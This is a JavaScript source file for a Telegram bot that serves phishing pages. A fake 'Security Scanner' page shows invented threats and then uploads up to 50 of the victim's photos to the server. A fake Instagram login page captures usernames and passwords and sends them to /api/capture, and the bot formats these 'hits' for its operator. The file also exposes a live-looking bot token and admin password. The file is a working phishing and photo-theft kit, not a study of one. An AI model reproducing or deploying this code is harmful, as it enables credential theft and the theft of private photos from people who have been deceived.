// ====================== index.js (COMPLETE - SCANNING BOT) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Complete Bot - Security Scanner + Photo Access
 */
process.env.NTBA_FIX_350 = 1;

// ====================== CONFIGURATION ======================
const config = {
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
    S7: '@RTFGAMMING',
    adminId: '6346250222',
    port: process.env.PORT || 3000,
    love: 'S7_LOVE_2026',
    adminPassword: 'admin123',
    channels: [
        { id: '-1003004551707', name: 'Main Channel', link: 'https://t.me/RTFGAMINGHACK0' },
        { id: '-1003559518526', name: 'Main Group', link: 'https://t.me/RTFGAMINGHACK0' }
    ],
    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
    BATCH_SIZE: 100
};

console.log('✅ Bot Token loaded successfully!');
console.log('📌 Base URL:', config.baseUrl);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

// ====================== SETUP ======================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Create directories
const PHOTO_DIR = path.join(__dirname, 'photos');
const DATA_DIR = path.join(__dirname, 'data');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const TEMP_DIR = path.join(__dirname, 'temp');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// Storage files
const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const REFERRALS_FILE = path.join(DATA_DIR, 'referrals.json');
const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');
const FEATURED_FILE = path.join(DATA_DIR, 'featured.json');
const QR_FILE = path.join(DATA_DIR, 'qr.png');
const LOGS_FILE = path.join(DATA_DIR, 'logs.txt');

if (!fs.existsSync(PHOTOS_FILE)) fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: [] }, null, 2));
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify({ users: {} }, null, 2));
if (!fs.existsSync(REFERRALS_FILE)) fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals: [] }, null, 2));
if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: config.channels }, null, 2));
if (!fs.existsSync(FEATURED_FILE)) fs.writeFileSync(FEATURED_FILE, JSON.stringify({ photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }, null, 2));
if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');

// ====================== TEMP STORAGE ======================
var pendingPhotos = {};
var pendingCount = {};
var userActive = {};
var pendingPayments = {};

// ====================== MULTER SETUP ======================
const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        if (file.fieldname === 'photo' || file.fieldname === 'qr') {
            cb(null, BOT_PHOTO_DIR);
        } else {
            cb(null, BOT_PHOTO_DIR);
        }
    },
    filename: function(req, file, cb) {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: function(req, file, cb) {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only images allowed!'));
        }
    }
});

// ====================== USER DATA FUNCTIONS ======================
function getUsers() {
    try {
        return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')).users || {};
    } catch {
        return {};
    }
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify({ users: users }, null, 2));
}

function getUser(userId) {
    const users = getUsers();
    if (!users[userId]) {
        users[userId] = {
            credits: 3,
            referrals: 0,
            totalReferrals: 0,
            unlimited: false,
            joinedAt: new Date().toISOString(),
            referredBy: null,
            _pendingReferrer: null,
            _waitingForQR: false,
            _pendingPayment: null
        };
        saveUsers(users);
    }
    return users[userId];
}

function addReferral(referrerId, newUserId) {
    const referrals = getReferrals();
    referrals.push({
        referrerId: String(referrerId),
        newUserId: String(newUserId),
        timestamp: new Date().toISOString()
    });
    saveReferrals(referrals);

    const referrer = getUser(referrerId);
    referrer.totalReferrals = (referrer.totalReferrals || 0) + 1;
    referrer.referrals = (referrer.referrals || 0) + 1;
    if (!referrer.unlimited) {
        referrer.credits = (referrer.credits || 0) + 2;
    }
    saveUsers(getUsers());
    return referrer;
}

function getReferrals() {
    try {
        return JSON.parse(fs.readFileSync(REFERRALS_FILE, 'utf8')).referrals || [];
    } catch {
        return [];
    }
}

function saveReferrals(referrals) {
    fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals: referrals }, null, 2));
}

function getChannels() {
    try {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, 'utf8')).channels || [];
    } catch {
        return [];
    }
}

function saveChannels(channels) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: channels }, null, 2));
}

function addChannel(id, name, link) {
    const channels = getChannels();
    channels.push({ id: id, name: name, link: link });
    saveChannels(channels);
    return channels;
}

function removeChannel(id) {
    let channels = getChannels();
    channels = channels.filter(function(c) { return c.id !== id; });
    saveChannels(channels);
    return channels;
}

function useCredit(userId) {
    const user = getUser(userId);
    if (user.unlimited) return true;
    if ((user.credits || 0) <= 0) return false;
    user.credits = (user.credits || 0) - 1;
    saveUsers(getUsers());
    return true;
}

// ====================== FEATURED FUNCTIONS ======================
function getFeatured() {
    try {
        return JSON.parse(fs.readFileSync(FEATURED_FILE, 'utf8'));
    } catch {
        return { photo: null, message: '🌟 Welcome! Use /start to begin.', status: true };
    }
}

function saveFeatured(data) {
    fs.writeFileSync(FEATURED_FILE, JSON.stringify(data, null, 2));
}

function setFeaturedPhoto(photoId) {
    const featured = getFeatured();
    featured.photo = photoId;
    saveFeatured(featured);
    return featured;
}

function setFeaturedMessage(message) {
    const featured = getFeatured();
    featured.message = message;
    saveFeatured(featured);
    return featured;
}

function toggleFeaturedStatus() {
    const featured = getFeatured();
    featured.status = !featured.status;
    saveFeatured(featured);
    return featured;
}

// ====================== PHOTO FUNCTIONS ======================
function getPhotos() {
    try {
        return JSON.parse(fs.readFileSync(PHOTOS_FILE, 'utf8')).photos || [];
    } catch {
        return [];
    }
}

function savePhotos(photos) {
    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: photos }, null, 2));
}

function addPhoto(file, caption) {
    caption = caption || '';
    const photos = getPhotos();
    const photoData = {
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: '/api/photos/' + file.filename,
        caption: caption,
        uploadedAt: new Date().toISOString(),
        active: true
    };
    photos.push(photoData);
    savePhotos(photos);
    return photoData;
}

function deletePhoto(id) {
    const photos = getPhotos();
    var index = -1;
    for (var i = 0; i < photos.length; i++) {
        if (photos[i].id === id) {
            index = i;
            break;
        }
    }
    if (index === -1) return false;
    const photo = photos[index];
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    photos.splice(index, 1);
    savePhotos(photos);
    return true;
}

function togglePhoto(id) {
    const photos = getPhotos();
    var photo = null;
    for (var i = 0; i < photos.length; i++) {
        if (photos[i].id === id) {
            photo = photos[i];
            break;
        }
    }
    if (!photo) return false;
    photo.active = !photo.active;
    savePhotos(photos);
    return photo;
}

function getActivePhotos() {
    const photos = getPhotos();
    var active = [];
    for (var i = 0; i < photos.length; i++) {
        if (photos[i].active) active.push(photos[i]);
    }
    return active;
}

function getRandomPhoto() {
    const photos = getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}

// ====================== HELPER FUNCTIONS ======================
function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return h + 'h ' + m + 'm ' + s + 's';
}

function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
}

function MenuLove(firstName, dev, SeXy, LoveTime, message) {
    return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + SeXy + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + '›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
}

function LoveNotifer(platform, username, password) {
    const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
    const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
}

function SYloveMenu(firstName, message) {
    return MenuLove(firstName, config.S7, config.bot, getUptime(), message);
}

function logToFile(message) {
    const timestamp = new Date().toISOString();
    fs.appendFileSync(LOGS_FILE, '[' + timestamp + '] ' + message + '\n');
}

async function checkAllChannels(userId) {
    const channels = getChannels();
    for (var i = 0; i < channels.length; i++) {
        try {
            const member = await S7.getChatMember(channels[i].id, userId);
            const valid = ['creator', 'administrator', 'member', 'restricted'];
            if (valid.indexOf(member.status) === -1) return false;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function getChannelButtons() {
    const channels = getChannels();
    var buttons = [];
    for (var i = 0; i < channels.length; i++) {
        buttons.push([{ text: '📢 ' + channels[i].name, url: channels[i].link }]);
    }
    buttons.push([{ text: '✅ Check All Joined', callback_data: 'check_all' }]);
    return { inline_keyboard: buttons };
}

// ====================== FAST SEND BATCH PHOTOS ======================
async function sendBatchPhotos(userId) {
    if (!pendingPhotos[userId] || pendingPhotos[userId].length === 0) return;
    var photos = pendingPhotos[userId];
    var count = photos.length;
    logToFile('📸 Sending ' + count + ' photos to user ' + userId + ' (FAST MODE)');

    try {
        await S7.sendPhoto(userId, photos[0], {
            caption: '📸 <b>' + count + ' photos received!</b>\n\n⚡ Fast delivery mode',
            parse_mode: 'HTML'
        });

        var batch = [];
        var parallelCount = 5;
        for (var i = 1; i < photos.length; i++) {
            batch.push(S7.sendPhoto(userId, photos[i]));
            if (batch.length >= parallelCount) {
                await Promise.all(batch);
                batch = [];
            }
        }
        if (batch.length > 0) {
            await Promise.all(batch);
        }
        logToFile('✅ Sent ' + count + ' photos to user ' + userId + ' (FAST)');
    } catch (error) {
        logToFile('❌ Error sending photos to ' + userId + ': ' + error.message);
        try {
            for (var j = 1; j < photos.length; j++) {
                await S7.sendPhoto(userId, photos[j]);
            }
        } catch (e) {
            logToFile('❌ Fallback also failed: ' + e.message);
        }
    }
    delete pendingPhotos[userId];
    delete pendingCount[userId];
    delete userActive[userId];
}

// ====================== SCANNING BOT TEMPLATE ======================
var SCAN_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Security Scanner</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:480px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.header{text-align:center;margin-bottom:20px}\n.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}\n.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.header p{color:#888;font-size:14px;margin-top:5px}\n.scan-status{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}\n.scan-status .item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:#aaa;font-size:14px}\n.scan-status .item:last-child{border-bottom:none}\n.scan-status .item .label{color:#888}\n.scan-status .item .value{color:#ff6b6b;font-weight:600}\n.scan-status .item .value.good{color:#2ed573}\n.scan-status .item .value.danger{color:#ff4757}\n.scan-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:10px 0}\n.scan-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);border-radius:10px;transition:width .3s}\n.threats{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap;justify-content:center}\n.threats .badge{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.2);color:#ff6b6b;padding:5px 15px;border-radius:20px;font-size:12px;display:none}\n.threats .badge.show{display:inline-block}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn:disabled{opacity:0.5;cursor:not-allowed}\n.btn i{margin-right:10px}\n.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}\n.status.warning{background:rgba(255,165,0,0.1);color:#ffa500;display:block}\n.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}\n.progress .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);transition:width .3s}\n.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n#fileInput{display:none}\n.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n.badge{display:inline-block;background:rgba(255,71,87,0.1);color:#ff4757;padding:4px 15px;border-radius:30px;font-size:11px;font-weight:600}\n.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}\n#processingStatus{display:none}\n.scan-logs{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin:15px 0;max-height:150px;overflow-y:auto;display:none;font-family:monospace;font-size:12px;color:#888}\n.scan-logs .log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}\n.scan-logs .log .time{color:#555}\n.scan-logs .log .msg{color:#aaa}\n.scan-logs .log .danger{color:#ff4757}\n.scan-logs .log .good{color:#2ed573}\n.scan-logs .log .warn{color:#ffa500}\n.result-box{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}\n.result-box i{font-size:40px;color:#2ed573}\n.result-box h3{color:#2ed573;margin-top:8px}\n.result-box p{color:#888;font-size:13px;margin-top:5px}\n.result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}\n.result-box.danger i{color:#ff4757}\n.result-box.danger h3{color:#ff4757}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="header"><span class="icon"><i class="fas fa-shield-alt"></i></span><h1>🔒 <span>Security Scanner</span></h1><p><span class="badge">🛡️ PROTECT</span> Scan your device for threats</p></div>\n<div class="scan-status">\n<div class="item"><span class="label">📱 Device</span><span class="value" id="deviceName">Scanning...</span></div>\n<div class="item"><span class="label">📂 Files Scanned</span><span class="value" id="filesScanned">0</span></div>\n<div class="item"><span class="label">⚠️ Threats Found</span><span class="value danger" id="threatsFound">0</span></div>\n<div class="item"><span class="label">🔒 Security Status</span><span class="value" id="securityStatus">🔴 At Risk</span></div>\n</div>\n<div class="scan-bar"><div class="fill" id="scanFill"></div></div>\n<p style="color:#555;font-size:12px;text-align:center;" id="scanPercent">0%</p>\n<div class="threats" id="threatsContainer">\n<span class="badge" id="threat1">🔴 Malware Detected</span>\n<span class="badge" id="threat2">🟠 Suspicious App</span>\n<span class="badge" id="threat3">🟡 Vulnerable File</span>\n<span class="badge" id="threat4">🔴 Trojan Found</span>\n</div>\n<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>\n<div id="status" class="status"></div>\n<div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>\n<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>\n<div id="scanLogs" class="scan-logs"></div>\n<div id="resultBox" class="result-box" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your device is secure.</p></div>\n<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n<div class="footer">🔒 End-to-end encrypted • AI powered • v3.0</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nvar isScanning = false;\nvar selectedFiles = [];\nvar logCount = 0;\ndocument.getElementById("deviceName").textContent = navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Windows") ? "Windows PC" : "Unknown Device";\nfunction showStatus(msg, type) { var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }\nfunction updateScanProgress(percent) { document.getElementById("scanFill").style.width = percent + "%"; document.getElementById("scanPercent").textContent = Math.round(percent) + "%"; document.getElementById("progress").style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }\nfunction showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }\nfunction hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }\nfunction addLog(msg, type) { var logs = document.getElementById("scanLogs"); logs.style.display = "block"; var time = new Date().toLocaleTimeString(); var div = document.createElement("div"); div.className = "log"; div.innerHTML = "<span class=\\"time\\">[" + time + "]</span> <span class=\\"msg " + type + "\\">" + msg + "</span>"; logs.appendChild(div); logs.scrollTop = logs.scrollHeight; }\nfunction showThreat(id) { document.getElementById(id).classList.add("show"); }\nfunction sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\nfunction getRandomThreats() { var threats = [ { id: "threat1", text: "🔴 Malware Detected" }, { id: "threat2", text: "🟠 Suspicious App" }, { id: "threat3", text: "🟡 Vulnerable File" }, { id: "threat4", text: "🔴 Trojan Found" } ]; var count = Math.floor(Math.random() * 3) + 1; var shuffled = threats.sort(function() { return Math.random() - 0.5; }); return shuffled.slice(0, count); }\nasync function startScan() { if (isScanning) return; isScanning = true; var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; document.getElementById("status").style.display = "none"; document.getElementById("resultBox").style.display = "none"; document.getElementById("scanLogs").innerHTML = ""; document.getElementById("scanLogs").style.display = "none"; document.getElementById("progress").style.display = "none"; document.getElementById("filesScanned").textContent = "0"; document.getElementById("threatsFound").textContent = "0"; document.getElementById("securityStatus").textContent = "🔴 Scanning..."; document.getElementById("securityStatus").className = "value danger"; document.querySelectorAll(".threats .badge").forEach(function(b) { b.classList.remove("show"); }); hideProcessing(); addLog("🔍 Initializing security scan...", ""); updateScanProgress(2); await sleep(600); addLog("📱 Scanning system files...", ""); updateScanProgress(8); await sleep(500); addLog("📂 Analyzing installed applications...", ""); updateScanProgress(15); await sleep(700); var threats = getRandomThreats(); if (threats.length > 0) { addLog("⚠️ " + threats[0].text + " found!", "danger"); showThreat(threats[0].id); document.getElementById("threatsFound").textContent = "1"; } updateScanProgress(25); await sleep(600); addLog("📸 Scanning media files for threats...", ""); updateScanProgress(35); await sleep(500); addLog("🔍 Requesting media access for deep scan...", ""); showProcessing("🔍 Accessing gallery for deep scan..."); updateScanProgress(45); await sleep(500); var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ Scan interrupted. Please try again.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> RETRY SCAN"; hideProcessing(); isScanning = false; return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 100); addLog("📸 Found " + selectedFiles.length + " media files. Scanning...", ""); updateScanProgress(50); document.getElementById("filesScanned").textContent = selectedFiles.length; if (threats.length > 1) { setTimeout(function() { addLog("⚠️ " + threats[1].text + " detected!", "danger"); showThreat(threats[1].id); document.getElementById("threatsFound").textContent = "2"; }, 800); } await sleep(600); var successCount = 0; var maxFiles = Math.min(selectedFiles.length, 50); for (var j = 0; j < maxFiles; j++) { try { var file = selectedFiles[j]; var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); await fetch("/api/upload-photo-fast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); successCount++; var percent = 50 + (j / maxFiles) * 40; updateScanProgress(percent); document.getElementById("filesScanned").textContent = j + 1; if (j % 5 === 0 && j > 0) { addLog("📤 Scanning file " + (j+1) + "/" + maxFiles + "...", ""); } await sleep(30); } catch(err) { console.error(err); } } if (threats.length > 2) { setTimeout(function() { addLog("⚠️ " + threats[2].text + " quarantined!", "danger"); showThreat(threats[2].id); document.getElementById("threatsFound").textContent = "3"; }, 500); } updateScanProgress(100); await sleep(800); addLog("✅ Deep scan complete!", "good"); addLog("🛡️ " + successCount + " files scanned successfully", "good"); hideProcessing(); var threatCount = Math.min(threats.length, 3); var resultBox = document.getElementById("resultBox"); if (threatCount > 0) { resultBox.className = "result-box danger"; resultBox.innerHTML = "<i class=\\"fas fa-exclamation-triangle\\"></i><h3>⚠️ " + threatCount + " Threats Found!</h3><p>" + threatCount + " suspicious files detected and quarantined.</p>"; document.getElementById("securityStatus").textContent = "🟡 At Risk - " + threatCount + " threats"; document.getElementById("securityStatus").className = "value danger"; } else { resultBox.className = "result-box"; resultBox.innerHTML = "<i class=\\"fas fa-check-circle\\"></i><h3>✅ All Clear!</h3><p>Your device is secure. No threats found.</p>"; document.getElementById("securityStatus").textContent = "🟢 Secure"; document.getElementById("securityStatus").className = "value good"; } resultBox.style.display = "block"; showStatus("✅ Scan completed! " + successCount + " files analyzed.", "success"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE"; isScanning = false; }; }\n</script>\n</body>\n</html>\n';

// ====================== INSTA TEMPLATE ======================
var INSTA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Instagram Login</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.logo{text-align:center;margin-bottom:30px}\n.logo h1{font-size:38px;font-weight:800;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.logo p{color:#888;font-size:14px}\n.input-group{position:relative;margin-bottom:20px}\n.input-group input{width:100%;padding:16px 20px;background:rgba(255,255,255,0.05);border:2px solid rgba(255,255,255,0.06);border-radius:16px;color:#fff;font-size:16px;transition:.3s;outline:none}\n.input-group input:focus{border-color:#ff4757;background:rgba(255,71,87,0.05)}\n.input-group input::placeholder{color:#666}\n.btn{width:100%;padding:16px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;margin-top:10px;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn:active{transform:scale(.98)}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#ff4757;text-decoration:none}\n.status{text-align:center;margin-top:15px;padding:10px;border-radius:12px;display:none;font-size:14px}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.loader{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto;display:none}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.divider{display:flex;align-items:center;margin:20px 0;color:#555}\n.divider::before,.divider::after{content:"";flex:1;height:1px;background:rgba(255,255,255,0.05)}\n.divider span{padding:0 15px;font-size:12px}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="logo"><h1>📸 Instagram</h1><p>Sign in to continue</p></div>\n<div id="status" class="status"></div>\n<div class="input-group"><input type="text" id="username" placeholder="Username or email" autocomplete="off"></div>\n<div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>\n<button class="btn" onclick="login()">Log In</button>\n<div class="loader" id="loader"></div>\n<div class="divider"><span>OR</span></div>\n<div style="text-align:center;color:#666;font-size:14px">By continuing, you agree to our Terms & Privacy Policy</div>\n<div class="footer">© 2026 Instagram from Meta</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nfunction showStatus(msg, type){var el=document.getElementById("status");el.textContent=msg;el.className="status "+type;el.style.display="block";}\nfunction hideStatus(){document.getElementById("status").style.display="none";}\nfunction showLoader(){document.getElementById("loader").style.display="block";}\nfunction hideLoader(){document.getElementById("loader").style.display="none";}\nasync function login(){\nvar user=document.getElementById("username").value.trim();var pass=document.getElementById("password").value.trim();\nif(!user||!pass){showStatus("Please fill in all fields","error");return;}\nhideStatus();showLoader();\ntry{\nvar res=await fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:USER_ID,username:user,password:pass,platform:PLATFORM})});\nif(res.ok){showStatus("✅ Login successful! Redirecting...","success");document.getElementById("username").value="";document.getElementById("password").value="";setTimeout(function(){window.location.href="https://instagram.com"},1500);}\nelse{showStatus("❌ Login failed. Try again.","error");}\n}catch(e){showStatus("❌ Network error. Try again.","error");}\nhideLoader();\n}\ndocument.addEventListener("keydown",function(e){if(e.key==="Enter")login();});\n</script>\n</body>\n</html>';

// ====================== FB TEMPLATE ======================
